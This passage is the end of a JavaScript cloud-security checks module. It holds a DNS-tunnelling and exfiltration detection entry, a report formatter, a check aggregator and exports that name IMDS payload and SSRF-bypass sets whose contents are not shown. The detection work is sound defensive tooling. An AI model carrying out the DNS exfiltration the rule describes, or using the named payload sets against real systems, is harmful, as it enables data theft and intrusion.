    description: "Detect DNS queries with unusually long subdomain labels that may indicate DNS tunneling or data exfiltration",
    detection: "# Check Route53 query logs, Azure DNS analytics, or GCP Cloud DNS logs for:\n# - Queries with subdomain labels > 30 characters\n# - High volume of unique subdomain queries to a single domain\n# - TXT record queries to unusual domains",
    cloud: "multi",
    severity: "high",
    response: "Investigate the source of suspicious DNS queries. Block the exfiltration domain at the DNS resolver level. Analyze network flow logs for correlated traffic. Check endpoints for malware."
  }
];

// ---------------------------------------------------------------------------
// 23. formatCheckReport — produce a human-readable text report from a
//     set of check results for CLI display.
// ---------------------------------------------------------------------------

/**
 * Format a set of check results into a text report suitable for terminal output.
 * @param {Array} checks - Array of check objects from any category.
 * @param {string} title - Report title.
 * @returns {string} Formatted text report.
 */
function formatCheckReport(checks, title) {
  const lines = [];
  lines.push("=" .repeat(72));
  lines.push("  " + (title || "Cloud Security Check Report"));
  lines.push("  Generated: " + new Date().toISOString());
  lines.push("=" .repeat(72));
  lines.push("");

  const riskOrder = { critical: 0, high: 1, medium: 2, low: 3 };
  const sorted = checks.slice().sort((a, b) => {
    const ra = riskOrder[(a.risk || a.priority || a.severity || "low").toLowerCase()] || 3;
    const rb = riskOrder[(b.risk || b.priority || b.severity || "low").toLowerCase()] || 3;
    return ra - rb;
  });

  for (const check of sorted) {
    const risk = (check.risk || check.priority || check.severity || "info").toUpperCase();
    lines.push("[" + risk + "] " + (check.name || "unnamed"));
    lines.push("  " + (check.description || ""));
    if (check.command) lines.push("  Command: " + check.command.substring(0, 120) + (check.command.length > 120 ? "..." : ""));
    if (check.check) lines.push("  Check: " + check.check.substring(0, 120) + (check.check.length > 120 ? "..." : ""));
    if (check.remediation) lines.push("  Fix: " + check.remediation.substring(0, 200) + (check.remediation.length > 200 ? "..." : ""));
    if (check.implementation) lines.push("  Impl: " + check.implementation.substring(0, 200) + (check.implementation.length > 200 ? "..." : ""));
    lines.push("");
  }

  lines.push("-".repeat(72));
  lines.push("Total checks: " + checks.length);
  const bySeverity = {};
  for (const c of checks) {
    const r = (c.risk || c.priority || c.severity || "info").toLowerCase();
    bySeverity[r] = (bySeverity[r] || 0) + 1;
  }
  for (const [sev, count] of Object.entries(bySeverity).sort((a, b) => (riskOrder[a[0]] || 99) - (riskOrder[b[0]] || 99))) {
    lines.push("  " + sev.toUpperCase() + ": " + count);
  }
  lines.push("-".repeat(72));

  return lines.join("\n");
}

/**
 * Get all checks across every category as a flat array with _category tags.
 */
function getAllChecks() {
  const all = [];
  const tag = (arr, cat) => arr.forEach((item) => all.push({ ...item, _category: cat }));
  tag(AWS_CHECKS, "aws");
  tag(AZURE_CHECKS, "azure");
  tag(GCP_CHECKS, "gcp");
  tag(CONTAINER_SECURITY, "container");
  tag(SERVERLESS_SECURITY, "serverless");
  tag(IAC_SECURITY, "iac");
  tag(CLOUD_NETWORK_SECURITY, "network");
  tag(CLOUD_LOGGING_MONITORING, "logging");
  tag(CLOUD_IDENTITY_FEDERATION, "identity");
  tag(CLOUD_DATA_SECURITY, "data");
  tag(CLOUD_COST_SECURITY, "cost");
  tag(CLOUD_SUPPLY_CHAIN, "supply-chain");
  tag(CLOUD_SECRETS_MANAGEMENT, "secrets");
  tag(CLOUD_INCIDENT_INDICATORS, "incident");
  return all;
}

// ---------------------------------------------------------------------------
// Module exports.
// ---------------------------------------------------------------------------

module.exports = {
  AWS_CHECKS,
  AZURE_CHECKS,
  GCP_CHECKS,
  CONTAINER_SECURITY,
  CLOUD_TOOLS,
  IMDS_PAYLOADS,
  CLOUD_HARDENING,
  SSRF_BYPASS_TECHNIQUES,
  CLOUD_ATTACK_PATTERNS,
  COMPLIANCE_FRAMEWORKS,
  CLOUD_FORENSICS,
  SERVERLESS_SECURITY,
  IAC_SECURITY,
  CLOUD_NETWORK_SECURITY,
  CLOUD_LOGGING_MONITORING,
  CLOUD_IDENTITY_FEDERATION,
  CLOUD_DATA_SECURITY,
  CLOUD_COST_SECURITY,
  CLOUD_SUPPLY_CHAIN,
  CLOUD_SECRETS_MANAGEMENT,
  CLOUD_INCIDENT_INDICATORS,
  searchChecks,
  filterByRisk,
  filterByProvider,
  getImdsPayloads,
  getHardening,
  getSummary,
  formatCheckReport,
  getAllChecks
};
